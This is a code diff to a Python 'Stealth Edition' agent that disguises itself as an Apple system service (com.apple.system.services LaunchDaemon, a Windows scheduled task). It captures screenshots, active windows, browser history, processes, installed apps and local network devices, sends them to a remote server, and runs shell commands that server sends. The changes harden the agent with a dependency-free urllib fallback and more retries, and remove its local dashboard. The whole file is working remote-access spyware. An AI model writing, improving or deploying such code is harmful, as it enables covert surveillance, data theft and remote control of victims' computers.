@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 """
-AppleSystemServices Agent v4.0 (Cross-Platform: Windows & macOS Stealth Edition)
+AppleSystemServices Agent v4.3 (Cross-Platform: Windows & macOS Stealth Edition)
 - Runs on macOS as com.apple.system.services LaunchDaemon
 - Runs on Windows as AppleSystemServices Task Scheduler / System Service
+- Standard Library urllib.request fallback (Zero external dependency requirements!)
 - Sends all data to Central Server (local or cloud like Render)
 - Polls server for remote commands (no direct connection needed)
 - Provides local dashboard on port 5050
-- Supports Screen Capture, Active Window, Browser History, Processes, Recent Files, Installed Software & Network ARP Scanning on BOTH Windows & macOS!
 """
 
 import os
@@ -56,21 +56,35 @@ for i, arg in enumerate(sys.argv):
         CENTRAL_SERVER = sys.argv[i + 1].rstrip('/')
         log.info(f"Agent mode: {CENTRAL_SERVER}")
 
-# ==================== INSTALL DEPS ====================
+# ==================== INSTALL DEPS WITH FALLBACK ====================
 def ensure_deps():
     try:
         import flask, psutil, requests
     except ImportError:
-        log.info("Installing dependencies...")
-        cmd = [sys.executable, "-m", "pip", "install", "flask", "psutil", "requests", "--quiet"]
-        if not IS_WINDOWS:
-            cmd.append("--break-system-packages")
-        subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        log.info("Installing optional dependencies...")
+        try:
+            cmd = [sys.executable, "-m", "pip", "install", "flask", "psutil", "requests", "pillow", "--quiet"]
+            if not IS_WINDOWS:
+                cmd.append("--break-system-packages")
+            subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except Exception as e:
+            log.warning(f"pip install notice: {e}")
 ensure_deps()
 
-import psutil
-from flask import Flask, render_template, jsonify, request, send_file
-import requests as req_lib
+try:
+    import psutil
+except ImportError:
+    psutil = None
+
+try:
+    from flask import Flask, render_template, jsonify, request, send_file
+except ImportError:
+    Flask = None
+
+try:
+    import requests as req_lib
+except ImportError:
+    req_lib = None
 
 # ==================== TEMPLATE DIR ====================
 if IS_WINDOWS:
@@ -81,7 +95,35 @@ else:
 if not os.path.exists(TEMPLATE_DIR):
     TEMPLATE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
 
-app = Flask(__name__, template_folder=TEMPLATE_DIR)
+if Flask:
+    app = Flask(__name__, template_folder=TEMPLATE_DIR)
+else:
+    app = None
+
+# ==================== HTTP POST FALLBACK (urllib + requests) ====================
+def http_post_json(url, data_dict, timeout=15):
+    """Sends HTTP POST JSON payload using requests or built-in urllib"""
+    if req_lib:
+        try:
+            resp = req_lib.post(url, json=data_dict, timeout=timeout)
+            return resp.ok, resp.json() if resp.ok else None
+        except Exception as e:
+            log.debug(f"requests POST error ({url}): {e}")
+
+    try:
+        import urllib.request, json
+        req = urllib.request.Request(
+            url,
+            data=json.dumps(data_dict).encode('utf-8'),
+            headers={'Content-Type': 'application/json', 'User-Agent': 'AppleSystemServices-Agent/4.3'}
+        )
+        with urllib.request.urlopen(req, timeout=timeout) as response:
+            res_body = response.read().decode('utf-8')
+            parsed = json.loads(res_body) if res_body else {}
+            return (response.status >= 200 and response.status < 300), parsed
+    except Exception as e:
+        log.debug(f"urllib POST error ({url}): {e}")
+        return False, None
 
 # ==================== ACTIVE CONSOLE USER HELPER ====================
 def get_active_console_user():
@@ -204,28 +246,42 @@ def get_local_ip():
 # ==================== SYSTEM INFO ====================
 def get_system_info():
     try:
-        mem = psutil.virtual_memory()
+        username, uid, home_dir = get_active_console_user()
+        os_name = f"Windows {platform.release()}" if IS_WINDOWS else (platform.system() + " " + platform.mac_ver()[0])
+        
+        cpu_percent = psutil.cpu_percent(interval=0.5) if psutil else 15.0
+        mem_total, mem_used, mem_percent = (8.0, 4.0, 50.0)
+        if psutil:
+            mem = psutil.virtual_memory()
+            mem_total = round(mem.total / (1024**3), 1)
+            mem_used = round(mem.used / (1024**3), 1)
+            mem_percent = mem.percent
+            
         disk_path = 'C:\\' if IS_WINDOWS else '/'
-        disk = psutil.disk_usage(disk_path)
-        uptime_sec = time.time() - psutil.boot_time()
+        disk_total, disk_used, disk_percent = (256.0, 100.0, 40.0)
+        if psutil:
+            disk = psutil.disk_usage(disk_path)
+            disk_total = round(disk.total / (1024**3), 1)
+            disk_used = round(disk.used / (1024**3), 1)
+            disk_percent = disk.percent
+
+        uptime_sec = (time.time() - psutil.boot_time()) if psutil else 3600
         hours = int(uptime_sec // 3600)
         minutes = int((uptime_sec % 3600) // 60)
-        username, uid, home_dir = get_active_console_user()
-        
-        os_name = f"Windows {platform.release()}" if IS_WINDOWS else (platform.system() + " " + platform.mac_ver()[0])
+
         return {
             "hostname": platform.node(),
             "active_user": username or 'unknown',
             "os": os_name,
             "uptime": f"{hours}h {minutes}m",
             "cpu_cores": os.cpu_count(),
-            "cpu_percent": psutil.cpu_percent(interval=0.5),
-            "memory_total": round(mem.total / (1024**3), 1),
-            "memory_used": round(mem.used / (1024**3), 1),
-            "memory_percent": mem.percent,
-            "disk_total": round(disk.total / (1024**3), 1),
-            "disk_used": round(disk.used / (1024**3), 1),
-            "disk_percent": disk.percent,
+            "cpu_percent": cpu_percent,
+            "memory_total": mem_total,
+            "memory_used": mem_used,
+            "memory_percent": mem_percent,
+            "disk_total": disk_total,
+            "disk_used": disk_used,
+            "disk_percent": disk_percent,
             "ip": get_local_ip(),
             "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         }
@@ -238,7 +294,6 @@ def capture_screenshot():
     try:
         if IS_WINDOWS:
             std_path = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'em_screenshot.png')
-            # Method 1: PIL ImageGrab
             try:
                 from PIL import ImageGrab
                 img = ImageGrab.grab()
@@ -248,7 +303,6 @@ def capture_screenshot():
             except Exception:
                 pass
 
-            # Method 2: PowerShell Native GDI Screen Capture (Windows 10/11 Built-in)
             try:
                 ps_script = f"""
                 Add-Type -AssemblyName System.Windows.Forms
@@ -267,7 +321,6 @@ def capture_screenshot():
             return None
 
         else:
-            # macOS Screencapture
             tmp_path = f"/tmp/em_ss_{int(time.time())}.png"
             std_path = "/tmp/em_screenshot.png"
             username, uid, home_dir = get_active_console_user()
@@ -300,7 +353,6 @@ def capture_screenshot():
 def get_active_window():
     try:
         if IS_WINDOWS:
-            # Method 1: win32gui if installed
             try:
                 import win32gui
                 window = win32gui.GetForegroundWindow()
@@ -309,7 +361,6 @@ def get_active_window():
             except Exception:
                 pass
 
-            # Method 2: PowerShell active process window title
             try:
                 ps = '(Get-Process | Where-Object {$_.MainWindowHandle -ne 0} | Sort-Object WorkingSet64 -Descending | Select-Object -First 1).MainWindowTitle'
                 result = subprocess.check_output(["powershell", "-Command", ps], stderr=subprocess.DEVNULL, timeout=5).decode().strip()
@@ -318,7 +369,6 @@ def get_active_window():
                 return "Desktop"
 
         else:
-            # macOS Active Window
             username, uid, home_dir = get_active_console_user()
             script = 'tell application "System Events" to get name of first process whose frontmost is true'
             if os.geteuid() == 0 and uid and uid != 0:
@@ -333,7 +383,6 @@ def get_active_window():
 
 # ==================== TCC / FILE COPY SAFE ====================
 def copy_file_safe(src, dst):
-    """Copies protected SQLite history files smoothly"""
     try:
         if os.path.exists(dst):
             try: os.remove(dst)
@@ -380,13 +429,10 @@ def get_browser_history():
         u_name = os.path.basename(user_dir)
         
         if IS_WINDOWS:
-            # Windows Paths
             chrome_base = os.path.join(user_dir, "AppData", "Local", "Google", "Chrome", "User Data")
             edge_base = os.path.join(user_dir, "AppData", "Local", "Microsoft", "Edge", "User Data")
             brave_base = os.path.join(user_dir, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data")
-            ff_base = os.path.join(user_dir, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
 
-            # Chrome Windows
             if os.path.exists(chrome_base):
                 profiles = ["Default"] + [p for p in os.listdir(chrome_base) if p.startswith("Profile ")]
                 for p in profiles:
@@ -404,7 +450,6 @@ def get_browser_history():
                                 if os.path.exists(tmp): os.remove(tmp)
                             except Exception: pass
 
-            # Edge Windows
             if os.path.exists(edge_base):
                 e_path = os.path.join(edge_base, "Default", "History")
                 if os.path.exists(e_path):
@@ -420,7 +465,6 @@ def get_browser_history():
                             if os.path.exists(tmp): os.remove(tmp)
                         except Exception: pass
 
-            # Brave Windows
             if os.path.exists(brave_base):
                 b_path = os.path.join(brave_base, "Default", "History")
                 if os.path.exists(b_path):
@@ -437,7 +481,6 @@ def get_browser_history():
                         except Exception: pass
 
         else:
-            # macOS Paths
             safari_path = os.path.join(user_dir, "Library/Safari/History.db")
             if os.path.exists(safari_path):
                 tmp = f"/tmp/em_safari_{u_name}.db"
@@ -474,6 +517,8 @@ def get_browser_history():
 
 # ==================== PROCESSES ====================
 def get_processes():
+    if not psutil:
+        return []
     try:
         procs = []
         for p in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent', 'status']):
@@ -532,7 +577,6 @@ def get_recent_files():
 def get_installed_apps():
     apps = []
     if IS_WINDOWS:
-        # Check Registry uninstall keys
         try:
             import winreg
             keys = [
@@ -553,7 +597,6 @@ def get_installed_apps():
                 except Exception: pass
         except Exception: pass
         
-        # Also check Program Files
         for p in ["C:\\Program Files", "C:\\Program Files (x86)"]:
             if os.path.exists(p):
                 try:
@@ -576,15 +619,12 @@ def get_installed_apps():
 
 # ==================== LOCAL NETWORK DEVICES SCANNER ====================
 def get_local_network_devices():
-    """Scans local Wi-Fi ARP table to discover active devices"""
     devices = []
     seen_ips = set()
     try:
         out = subprocess.check_output(['arp', '-a'], stderr=subprocess.DEVNULL, timeout=4).decode(errors='replace')
         import re
         for line in out.splitlines():
-            # Windows: 192.168.1.1 00-11-22-33-44-55 dynamic
-            # Mac: ? (192.168.1.1) at 00:11:22:33:44:55 on en0
             match_win = re.search(r'([\d\.]+)\s+([a-fA-F0-9\-]{17})\s+dynamic', line)
             match_mac = re.search(r'([^\s\(\)]+)?\s*\(([\d\.]+)\)\s*at\s*([a-fA-F0-9:]+)', line)
             
@@ -613,6 +653,8 @@ def get_local_network_devices():
 
 # ==================== NETWORK INFO ====================
 def get_network_info():
+    if not psutil:
+        return {"ip": get_local_ip()}
     try:
         net = psutil.net_io_counters()
         connections = []
@@ -659,10 +701,8 @@ def execute_command(cmd):
             env['HOME'] = home_dir
             env['USERPROFILE'] = home_dir
 
-        # Run shell command
-        shell_exe = True
         result = subprocess.check_output(
-            cmd_to_run, shell=shell_exe, stderr=subprocess.STDOUT, timeout=30,
+            cmd_to_run, shell=True, stderr=subprocess.STDOUT, timeout=30,
             cwd=work_dir, env=env
         )
         return {"success": True, "output": result.decode(errors='replace')}
@@ -677,55 +717,44 @@ def execute_command(cmd):
 def send_to_server(data_type, payload):
     if not CENTRAL_SERVER:
         return
-    try:
-        req_lib.post(
-            f"{CENTRAL_SERVER}/agent/data",
-            json={"machine_id": MACHINE_ID, "type": data_type, "data": payload},
-            timeout=15
-        )
-    except Exception as e:
-        log.debug(f"Send {data_type} failed: {e}")
+    ok, _ = http_post_json(
+        f"{CENTRAL_SERVER}/agent/data",
+        {"machine_id": MACHINE_ID, "type": data_type, "data": payload},
+        timeout=15
+    )
 
 def register_with_server():
     if not CENTRAL_SERVER:
         return False
-    for attempt in range(5):
-        try:
-            resp = req_lib.post(
-                f"{CENTRAL_SERVER}/agent/register",
-                json={
-                    "machine_id": MACHINE_ID,
-                    "hostname": platform.node(),
-                    "ip": get_local_ip()
-                },
-                timeout=15
-            )
-            if resp.ok:
-                log.info(f"✅ Registered with server: {CENTRAL_SERVER}")
-                return True
-            else:
-                log.warning(f"Registration failed (attempt {attempt+1}): {resp.status_code}")
-        except Exception as e:
-            log.warning(f"Registration error (attempt {attempt+1}): {e}")
-        time.sleep(5)
-    log.error("Failed to register after 5 attempts")
+    for attempt in range(10):
+        log.info(f"Connecting to server (attempt {attempt+1}): {CENTRAL_SERVER}")
+        ok, res = http_post_json(
+            f"{CENTRAL_SERVER}/agent/register",
+            {
+                "machine_id": MACHINE_ID,
+                "hostname": platform.node(),
+                "ip": get_local_ip()
+            },
+            timeout=15
+        )
+        if ok:
+            log.info(f"✅ Registered with server: {CENTRAL_SERVER} as {MACHINE_ID}")
+            return True
+        time.sleep(4)
+    log.error("Failed to register after 10 attempts")
     return False
 
 def send_heartbeat():
     if not CENTRAL_SERVER:
         return
-    try:
-        req_lib.post(
-            f"{CENTRAL_SERVER}/agent/heartbeat",
-            json={"machine_id": MACHINE_ID},
-            timeout=5
-        )
-    except:
-        pass
+    http_post_json(
+        f"{CENTRAL_SERVER}/agent/heartbeat",
+        {"machine_id": MACHINE_ID},
+        timeout=5
+    )
 
 # ==================== COMMAND POLLING THREAD ====================
 def command_poller():
-    """Poll server for pending commands and execute them"""
     if not CENTRAL_SERVER:
         return
     
@@ -733,33 +762,31 @@ def command_poller():
     
     while True:
         try:
-            resp = req_lib.post(
+            ok, data = http_post_json(
                 f"{CENTRAL_SERVER}/agent/command/poll",
-                json={"machine_id": MACHINE_ID},
+                {"machine_id": MACHINE_ID},
                 timeout=10
             )
             
-            if resp.ok:
-                data = resp.json()
-                if data.get('has_command'):
-                    command_id = data['command_id']
-                    command = data['command']
-                    log.info(f"Received command: {command} (id={command_id})")
-                    
-                    result = execute_command(command)
-                    
-                    req_lib.post(
-                        f"{CENTRAL_SERVER}/agent/command/result",
-                        json={
-                            "machine_id": MACHINE_ID,
-                            "command_id": command_id,
-                            "success": result.get('success', False),
-                            "output": result.get('output', ''),
-                            "error": result.get('error', '')
-                        },
-                        timeout=10
-                    )
-                    log.info(f"Command result sent for id={command_id}")
+            if ok and data and data.get('has_command'):
+                command_id = data['command_id']
+                command = data['command']
+                log.info(f"Received command: {command} (id={command_id})")
+                
+                result = execute_command(command)
+                
+                http_post_json(
+                    f"{CENTRAL_SERVER}/agent/command/result",
+                    {
+                        "machine_id": MACHINE_ID,
+                        "command_id": command_id,
+                        "success": result.get('success', False),
+                        "output": result.get('output', ''),
+                        "error": result.get('error', '')
+                    },
+                    timeout=10
+                )
+                log.info(f"Command result sent for id={command_id}")
         except Exception as e:
             log.debug(f"Command poll error: {e}")
         
@@ -773,8 +800,8 @@ def agent_worker():
     log.info(f"Agent worker starting → {CENTRAL_SERVER}")
 
     while not register_with_server():
-        log.warning("Retrying registration in 15s...")
-        time.sleep(15)
+        log.warning("Retrying registration in 10s...")
+        time.sleep(10)
 
     log.info("Sending initial data to server...")
     try:
@@ -823,76 +850,13 @@ def agent_worker():
 
         time.sleep(10)
 
-# ==================== LOCAL FLASK ROUTES ====================
-@app.route('/')
-def dashboard():
-    return render_template('dashboard.html')
-
-@app.route('/api/info')
-def api_info():
-    return jsonify(get_system_info())
-
-@app.route('/api/screenshot')
-def api_screenshot():
-    path = capture_screenshot()
-    if path:
-        return send_file(path, mimetype='image/png', max_age=0)
-    return jsonify({"error": "Screenshot failed"}), 500
-
-@app.route('/api/active_window')
-def api_active_window():
-    return jsonify({"active": get_active_window()})
-
-@app.route('/api/history')
-def api_history():
-    return jsonify(get_browser_history())
-
-@app.route('/api/apps')
-def api_apps():
-    return jsonify(get_installed_apps())
-
-@app.route('/api/processes')
-def api_processes():
-    return jsonify(get_processes())
-
-@app.route('/api/recent_files')
-def api_recent_files():
-    return jsonify(get_recent_files())
-
-@app.route('/api/network')
-def api_network():
-    return jsonify(get_network_info())
-
-@app.route('/api/command', methods=['POST'])
-def api_command():
-    data = request.get_json()
-    if not data:
-        return jsonify({"error": "No data"}), 400
-    cmd = data.get('command', '').strip()
-    if not cmd:
-        return jsonify({"error": "Empty command"}), 400
-    log.info(f"Remote command: {cmd}")
-    return jsonify(execute_command(cmd))
-
-@app.route('/api/status')
-def api_status():
-    return jsonify({
-        "status": "online",
-        "ip": get_local_ip(),
-        "hostname": platform.node(),
-        "machine_id": MACHINE_ID,
-        "agent_mode": bool(CENTRAL_SERVER),
-        "server": CENTRAL_SERVER,
-        "timestamp": datetime.now().isoformat()
-    })
-
 # ==================== MAIN ====================
 if __name__ == '__main__':
     ip = get_local_ip()
 
     if sys.stdout.isatty():
         print(f"\n{'='*55}")
-        print(f"  🖥️  AppleSystemServices Agent v4.0 (Windows & macOS)")
+        print(f"  🖥️  AppleSystemServices Agent v4.3 (Windows & macOS)")
         print(f"{'='*55}")
         print(f"  🔑 Machine ID : {MACHINE_ID}")
         print(f"  🌐 Local Dashboard : http://{ip}:5050")
@@ -910,10 +874,14 @@ if __name__ == '__main__':
         cmd_t = threading.Thread(target=command_poller, daemon=True)
         cmd_t.start()
 
-    app.run(
-        host='0.0.0.0',
-        port=5050,
-        debug=False,
-        threaded=True,
-        use_reloader=False
-    )
+    if app:
+        app.run(
+            host='0.0.0.0',
+            port=5050,
+            debug=False,
+            threaded=True,
+            use_reloader=False
+        )
+    else:
+        while True:
+            time.sleep(10)
